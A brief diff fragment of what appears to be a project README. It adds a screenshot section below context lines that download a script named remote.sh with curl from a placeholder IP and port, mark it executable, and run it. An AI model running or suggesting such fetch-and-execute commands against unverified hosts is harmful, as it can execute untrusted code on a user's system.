@@ -20,3 +20,9 @@ curl -O http://<IP>:<PORT>/remote.sh
 chmod +x remote.sh
 ./remote.sh
 ```
+
+# Screenshot
+
+![local](./screenshot/local.jpg)
+
+![remote](./screenshot/remote.jpg)
